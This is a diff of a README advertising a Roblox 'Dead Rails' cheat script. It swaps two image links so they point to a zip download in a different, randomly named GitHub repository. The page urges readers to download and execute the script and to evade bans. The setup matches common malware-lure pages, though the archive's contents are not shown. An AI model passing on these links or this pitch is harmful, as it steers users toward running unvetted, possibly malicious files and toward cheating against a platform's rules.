@@ -3,10 +3,10 @@
 If you're searching for the latest, most effective **Dead Rails Script for Roblox**, you've just hit the jackpot. This guide is packed with everything you need to know—from **how to get the best Dead Rails script**, to how to **safely execute it**, what features to expect, and how to maximize your gameplay without getting banned. Whether you're a beginner or an experienced exploiter, this guide will give you everything you need to dominate the Dead Rails map.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 [![hq720](https://github.com/user-attachments/assets/4e1af1f4-51ab-4a71-844a-139b01b802de)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 ---
 
